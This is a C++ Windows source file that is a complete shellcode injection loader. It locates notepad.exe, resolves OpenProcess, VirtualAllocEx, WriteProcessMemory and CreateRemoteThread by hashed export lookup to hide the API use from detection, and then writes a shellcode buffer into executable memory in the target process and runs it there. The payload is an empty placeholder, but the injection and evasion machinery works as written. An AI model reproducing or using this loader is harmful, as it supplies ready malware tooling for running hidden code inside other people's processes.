#include <Windows.h>
#include <tlhelp32.h>
#include <algorithm> 
#include <winternl.h>
#include <iostream>
#include "header.h"
#include <cstdarg>
#include <string>
#include <vector>
#include <print>

#define FAIL(processName) std::println("{} failed: {}",processName,GetLastError())
#define PTR_ADD_OFFSET( Pointer,Offset )((PVOID)((ULONG_PTR)(Pointer) + (ULONG_PTR)(Offset)))

void cleanup(DWORD count,...)
{
  std::va_list list;
  
  va_start(list,count);

  for ( DWORD arg{ 0 }; arg < count; arg++  )
  {
    HANDLE hVar = va_arg(list,HANDLE);

    if ( ! CloseHandle(hVar) )
    {
      FAIL("CloseHandle");
      std::exit(0);
    }
  }

  va_end(list);
  std::println("[+] Cleaned");

  std::exit(1);
}


DWORD findProcessId(std::wstring TargetProcess)
{

  PROCESSENTRY32* pEntry = new PROCESSENTRY32;
  pEntry->dwSize = sizeof(PROCESSENTRY32);

  HANDLE hSnapshot        = nullptr;
  

  hSnapshot = CreateToolhelp32Snapshot
      (
        TH32CS_SNAPPROCESS,
        0
      );

  if ( hSnapshot == INVALID_HANDLE_VALUE )
  {
    FAIL("CreateToolHelp32Snapshot");
    cleanup(1, hSnapshot);
  }

  std::println("[+] Created Snapshot {}",hSnapshot);

  if ( ! Process32First(hSnapshot,pEntry) )
  {
    FAIL("Process32First");
    cleanup(1,hSnapshot);
    
  }

  do 
  {
    std::wstring ProcessName(pEntry->szExeFile);
    std::transform(TargetProcess.begin(), TargetProcess.end(), TargetProcess.begin(), ::tolower);
    std::transform(ProcessName.begin(), ProcessName.end(), ProcessName.begin(), ::tolower);

    if ( ProcessName == TargetProcess )
    {
      std::wprintf(L"[+] %s found with pid: %d\n",ProcessName.c_str(),pEntry->th32ProcessID);
      return pEntry->th32ProcessID;
    }

  } while( Process32Next( hSnapshot, pEntry ) );

  std::wprintf(L"[-] Could not find %s\n",TargetProcess.c_str());
  cleanup(1,hSnapshot);

  return 1;
}

DWORD hashFunction(std::string funcName)
{
  std::hash<std::string> hasher;
  auto hashResult = hasher(funcName);
  return hashResult;

}

PVOID getAddressFromHash(std::wstring library, DWORD hash)
{
  PVOID baseAddress { LoadLibrary(library.c_str() ) };
  
  if (  baseAddress == NULL )
  {
    FAIL("LoadLibrary");
    std::exit(1);
  }

  PIMAGE_NT_HEADERS          pNtHeaders      { static_cast<PIMAGE_NT_HEADERS>( PTR_ADD_OFFSET( baseAddress, static_cast<PIMAGE_DOS_HEADER>( baseAddress )->e_lfanew ) ) };

  PIMAGE_OPTIONAL_HEADER64   pOptionalHeader { &pNtHeaders->OptionalHeader };

  PIMAGE_EXPORT_DIRECTORY    pExports        { static_cast<PIMAGE_EXPORT_DIRECTORY>( PTR_ADD_OFFSET( baseAddress, pOptionalHeader->DataDirectory[0].VirtualAddress ) ) };


  PDWORD  addressOfNameOrdinals   { (PDWORD)PTR_ADD_OFFSET( baseAddress, pExports->AddressOfNameOrdinals ) },
            addressOfFunctions    { (PDWORD)PTR_ADD_OFFSET( baseAddress, pExports->AddressOfFunctions    ) },
            addressOfNames        { (PDWORD)PTR_ADD_OFFSET( baseAddress, pExports->AddressOfNames        ) };

  for ( DWORD i{ 0 }; i < pExports->NumberOfFunctions; i++ )
  {

    DWORD       functionNameRVA = addressOfNames[i];
    DWORD64     functionNameVA  = (DWORD64)PTR_ADD_OFFSET( baseAddress, functionNameRVA );

    std::string functionName( reinterpret_cast<CHAR*>( functionNameVA  ) );

    //std::println("{}\n",functionName);


    if ( hash == hashFunction(functionName) )
    {
      DWORD functionAddressRVA = addressOfFunctions[i];

      DWORD64 functionAddress    = (DWORD64)PTR_ADD_OFFSET(baseAddress,functionAddressRVA);
      
      std::println("[+] Found {}:0x{}",functionName,functionAddress,hash);
      return (PVOID)functionAddress;
    }
  }

  std::println("[-] Could not find any matching hashes");
  std::exit(1);
  
  return NULL;
}


int main(){
 
  DWORD crtHash  { hashFunction( "CreateRemoteThread"  ) },
         wpmHash { hashFunction( "WriteProcessMemory" ) },
         vaHash  { hashFunction( "VirtualAllocEx"     ) },
         opHash  { hashFunction( "OpenProcess"        ) };

 // std::cout << crtHash  << '\n'
 //           << wpmHash  << '\n'
 //           << vaHash   << '\n'
 //           << opHash   << '\n';
 //
  HASH::CreateRemoteThread    hCreateRemoteThread = (HASH::CreateRemoteThread) getAddressFromHash( L"kernel32", 3416683523 );
  HASH::WriteProcessMemory    hWriteProcessMemory = (HASH::WriteProcessMemory) getAddressFromHash( L"kernel32", 2698947274 );
  HASH::VirtualAllocEx        hVirtualAllocEx     = (HASH::VirtualAllocEx)     getAddressFromHash( L"kernel32", 911751036  );
  HASH::OpenProcess           hOpenProcess        = (HASH::OpenProcess)        getAddressFromHash( L"kernel32", 2373964214 );


  std::vector<BYTE> shellcode = { 0 };

  HANDLE hProcess        { nullptr },
         hThread         { nullptr };

  LPVOID lpBuffer        { nullptr },
         lpShellcode     { nullptr };

  DWORD  dwBytesWritten  { 0 },
         dwPid           { 0 };

  SIZE_T stShellcodeSize { shellcode.size() },
         stBytesWritten  { 0 };


  dwPid = findProcessId(L"notepad.exe");

  hProcess = hOpenProcess(
              PROCESS_ALL_ACCESS,
              FALSE,
              dwPid
              );

  if ( hProcess == NULL )
  {
    FAIL("OpenProcess");
    cleanup(1,hProcess);
  }


  lpBuffer = hVirtualAllocEx(
            hProcess,
            NULL,
            stShellcodeSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
            );

 if ( lpBuffer == NULL )
  {
    FAIL("VirtualAllocEx");
    cleanup(1,hProcess);
  }
  std::println("[+] Allocated space at {}",lpBuffer);


  if ( ! hWriteProcessMemory(
         hProcess,
         lpBuffer,
         reinterpret_cast<LPCVOID>( shellcode.data() ),
         stShellcodeSize, 
         &stBytesWritten
         )
      ){ FAIL("WriteProcessMemory"); cleanup(1,hProcess); }

  std::wprintf(L"[+] Wrote %zu bytes of data to 0x%p\n",stBytesWritten,lpBuffer);
  
  std::wprintf(L"[+] Executing shellcode...\n");
  
  hThread = hCreateRemoteThread(
      hProcess,
      NULL,
      NULL,
      reinterpret_cast<LPTHREAD_START_ROUTINE>(lpBuffer),
      NULL,
      0,
      NULL
      );

  WaitForSingleObject(hThread, 2000);
  
  return 0;
}
